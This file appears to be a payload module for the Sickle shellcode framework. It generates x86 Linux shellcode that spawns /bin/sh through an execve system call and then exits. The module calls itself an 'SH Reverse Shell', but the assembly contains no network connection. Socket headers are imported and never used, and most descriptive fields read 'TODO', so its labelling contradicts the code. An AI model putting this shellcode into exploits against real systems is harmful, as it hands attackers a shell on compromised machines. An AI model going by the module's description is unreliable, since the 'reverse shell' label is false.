import sys
import struct

from sickle.common.lib.generic import convert
from sickle.common.lib.generic import modparser
from sickle.common.lib.reversing import mappings

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.linux import (
    net,
    bits_socket,
)

class Shellcode():

    arch = "x86"

    platform = "linux"

    name = f"Linux ({arch}) SH Reverse Shell"

    module = f"{platform}/{arch}/execve"

    example_run = f"TODO"

    ring = 3

    author = ["Jean Pascal Pereira <pereira@secbiz.de>", # Original author (https://shell-storm.org/shellcode/files/shellcode-811.html)
              "wetw0rk"]                     # Sickle module

    tested_platforms = ["TODO"]

    summary = ("TODO")

    description = ("TODO")

    arguments = {}

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

    def generate_source(self):
        """Returns assembly source code for the main functionality of the stub
        """

        source_code = f"""
start:
    xor    eax,eax
    push   eax
    push   0x68732f2f
    push   0x6e69622f
    mov    ebx, esp
    mov    ecx, eax
    mov    edx, eax
    mov    al, 0xb
    int    0x80
    xor    eax,eax
    inc    eax
    int    0x80

        """

        return source_code

    def get_shellcode(self):
        """Generates Shellcode
        """

        generator = Assembler(Shellcode.arch)
        src = self.generate_source()

        shellcode = generator.get_bytes_from_asm(src)

        return shellcode
